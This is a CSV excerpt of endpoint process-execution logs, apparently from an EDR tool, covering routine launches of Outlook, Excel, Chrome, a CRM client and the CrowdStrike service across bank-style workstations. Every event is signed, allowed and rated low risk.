event_id,timestamp,asset_id,user_id,parent_process,process_name,command_line,sha256,signature_status,edr_action,risk_level
P00058,2026-09-07 14:38:51,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",d18781862afcb1ecfa6d4e331e9e60072f8e6a74da57861e4ddc35aca9b6098f,signed,ALLOWED,Low
P00059,2026-09-07 14:38:58,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",4ea165c2279b97122921ec985318adbe11b41448b2c83f3794c170e7d12ba075,signed,ALLOWED,Low
P00060,2026-09-07 14:41:57,WKST-OND-004,ndjaba,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",0b47507ade4efe06984eacbdf03619a7adbda2082de97c060c8fd3ec5c9473fa,signed,ALLOWED,Low
P00061,2026-09-07 14:59:52,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",cdf60757fc02ff5e83ff0f98ed49374ed0d720c2d3b4d14f715f0517d7bc264c,signed,ALLOWED,Low
P00062,2026-09-07 15:26:46,WKST-PRC-008,sankwasa,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8123410c8b4fcc6f56dd5e70a3825db22bf4bb542123d878a7357a6529c58acb,signed,ALLOWED,Low
P00063,2026-09-07 15:34:11,WKST-IT-005,nghifindaka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d7b28c8a83cbb925d679d85602b9f10b1df81a323328cbf9e87a09e0d72f55ae,signed,ALLOWED,Low
P00064,2026-09-07 15:48:29,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",500bf8f33dfa5629f18fa7ef28a33898db289cb97886fb72fbd9c2faa2512ebc,signed,ALLOWED,Low
P00065,2026-09-07 16:09:21,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",135ba8290bdc06bc571d3e95beb7e45230ea127fa4137c7867893e944e6ab096,signed,ALLOWED,Low
P00066,2026-09-07 16:11:50,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",deb9018144f5e76f78ddf342d2c757a7cc6ac9b579a113a8aca5beccf29d526c,signed,ALLOWED,Low
P00067,2026-09-07 16:27:49,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d5e329e4154bf381a026cf5d6206541e74c908fd282cf0eb4b3c17e9a368e3b6,signed,ALLOWED,Low
P00068,2026-09-07 16:35:24,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",894aaa1db124ee965f4a27345112498834ef29a288959411748d111c9d615e96,signed,ALLOWED,Low
P00069,2026-09-07 16:37:25,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",df09c08b15070c1557dc00d8627ed0b32ea90b240df120ebfffa05a6d777b5ea,signed,ALLOWED,Low
P00070,2026-09-07 16:42:05,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",173b0ed64b8e5344a91e77ab5ad5b94d89f198d66b315b323b1322dbdc5cf4e5,signed,ALLOWED,Low
P00071,2026-09-07 16:44:32,WKST-CMP-003,amupanda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,2dfacbdcababa5d2dfbbf810b3d350feacd2fa1b007dccf4e2fe2a5b0bd9936b,signed,ALLOWED,Low
P00072,2026-09-07 16:50:29,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",3cb8b4e49d82566a14debd70128c4bccf457f7daec9799aef51c75d64666e812,signed,ALLOWED,Low
P00073,2026-09-07 17:07:16,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",a4b74232baf91f70d02e11b7552c87d36fecc822e150e061180418fc9eaba272,signed,ALLOWED,Low
P00074,2026-09-07 17:22:54,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",dd1b4fd75b38c0d636662a8d40f3dce684ba07943c883c23ebd087db97cf4243,signed,ALLOWED,Low
P00075,2026-09-07 17:23:54,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6bc1b85d87adbfc9f47e0f80b5ae9c5d18e23e6a211923e8f93650941e7d7d36,signed,ALLOWED,Low
P00076,2026-09-07 17:47:31,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a2fb1ff0ef5b0de79812d8d874ac0293124fcb96f946ae850f467aa4cef06576,signed,ALLOWED,Low
P00077,2026-09-07 18:09:41,WKST-MKT-010,ntinda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",c5770851c2ae39e39a83cce04d4aa044e18632f5f751cc16a0abfd917ab79422,signed,ALLOWED,Low
P00078,2026-09-07 18:25:55,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,87a95ca138121f9a7b338a5b07690fddc45311406c7815c064519e5d17cafba1,signed,ALLOWED,Low
P00079,2026-09-07 18:30:13,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2ae078b87d204df7df5098b3b1ecc56b653fd9afab5739beabab42e6b1cb1fc4,signed,ALLOWED,Low
P00080,2026-09-07 18:46:11,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",6049d8a92a96cefb162f53137ecffb03d529205d751e22359937757ff8803dfa,signed,ALLOWED,Low
P00081,2026-09-07 18:49:08,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",cdc8f9c2319120644f498faf11af1f620db59914a4059675864cf75e5481ade1,signed,ALLOWED,Low
P00082,2026-09-07 19:15:22,WKST-SWK-008,sihuhua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ed1af5e83c844bcc0123901c18209d042d4007268a8e5dd91c51ac2d855dc454,signed,ALLOWED,Low
P00083,2026-09-07 19:36:08,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",55f8b82faaf62b7966b1643754f188b0471ad113b340a8251252c41b406e784a,signed,ALLOWED,Low
P00084,2026-09-07 19:53:48,WKST-CMP-009,kndjavera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",7c09054a0c20d7f8f0e0b2ecc06808f9d5c85baa54dfa84416b7f4e9c95318d3,signed,ALLOWED,Low
P00085,2026-09-07 19:55:48,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,e74def2cfd500fda8793541382ae2c8d85acffb7c3a68996e7e9290479019c9a,signed,ALLOWED,Low
P00086,2026-09-08 06:00:07,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",1e5815648888f5d0f1f5210d3366bd89120ad12482fa1e5f5ad5bc4fd705f7d9,signed,ALLOWED,Low
P00087,2026-09-08 06:12:42,WKST-HR-014,mukwambi,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a5da44750885c4244ead474b606da2638bc1a959a9fdbbf1acebe4e1bce4bc74,signed,ALLOWED,Low
P00088,2026-09-08 06:13:09,WKST-SWK-008,sihuhua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",aff6e3d1bef5a4fc0a1e50bec4d3e8fef2ee19900639cded7a7de0a4c7044d3d,signed,ALLOWED,Low
P00089,2026-09-08 06:48:59,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c67ed22993db94aa6b3e2b15e5c4f719d54e5d42e641f7668c9437c05e20a4c0,signed,ALLOWED,Low
P00090,2026-09-08 07:09:36,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",4bfe41352cc7ba5cf10083a6a00cb6c1e6d90e2ad9627eb9eb6a1b7ccd5d1317,signed,ALLOWED,Low
P00091,2026-09-08 07:11:17,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5b1f844023ad25f94e5873aae43382adece5c2059dd89ab00284dec497df43f6,signed,ALLOWED,Low
P00092,2026-09-08 07:31:03,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6b163cfaf95001f8b18be0aa5ec67ebba52c964ae19e0ad7b75f0e2a807f412f,signed,ALLOWED,Low
P00093,2026-09-08 07:34:02,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",73f666cc51810560050f6f749693a91fba73a9bea16cf02d9ffcf70943b2615a,signed,ALLOWED,Low
P00094,2026-09-08 07:46:28,WKST-CS-017,mhaingura,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",14e04ffbe7ecf69ab502a9a1776c7dd279a3a20d34886f2e079cb21fa8cbdff5,signed,ALLOWED,Low
P00095,2026-09-08 07:54:09,WKST-CS-017,mhaingura,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",4c5ab8b8b21ccda53b3cf783d73ffd616667e1bb4841961570e911ad2d26050a,signed,ALLOWED,Low
P00096,2026-09-08 08:01:47,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",79784bb7fe62b6c3fe1d68251ed0fe2a8143eb37fdd7d71d1137b9d59ede2ef7,signed,ALLOWED,Low
P00097,2026-09-08 08:05:29,WKST-SWK-008,sihuhua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",bbf3792e989ad9bf41a68bdab0340a79c57fd8b0bd974b657a83d24784ff9010,signed,ALLOWED,Low
P00098,2026-09-08 08:08:09,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3f4eb0d0807bca8e3a860ebeaf94d89da3c2788d8b07a45d85fd537605b70252,signed,ALLOWED,Low
P00099,2026-09-08 08:37:16,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",dcde30ed5557393192e215a65919bfb7acd1e90fbf3feae1dcb644ec53daab31,signed,ALLOWED,Low
P00100,2026-09-08 08:52:09,WKST-EXE-002,shapaka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",720cd440b137a8bc8c70fffc61c221121d8867b7f082e76d57cd9c4a56d4e3e1,signed,ALLOWED,Low
P00101,2026-09-08 09:12:06,WKST-SOC-003,haufiku,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ee08e0ad9f5a2daa7bfae217283e1f4b1d030a7b1fba18bc14ae7227abfac377,signed,ALLOWED,Low
P00102,2026-09-08 09:30:17,WKST-PRC-008,sankwasa,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",ba4da8cf53c1363a48ce3514079eee5156fafdf56c08b5e67cc0da4153f4cd5d,signed,ALLOWED,Low
P00103,2026-09-08 09:33:11,WKST-CS-006,nnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",7067835d893e7d0d3bae6777c5a977735330a0925da250e3d47e7ebb32648c8e,signed,ALLOWED,Low
P00104,2026-09-08 09:35:35,WKST-LOAN-018,shilongo,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",68065e758794099a57f43f2aaf7b17277a73b24b233d70dc649037ac0b259343,signed,ALLOWED,Low
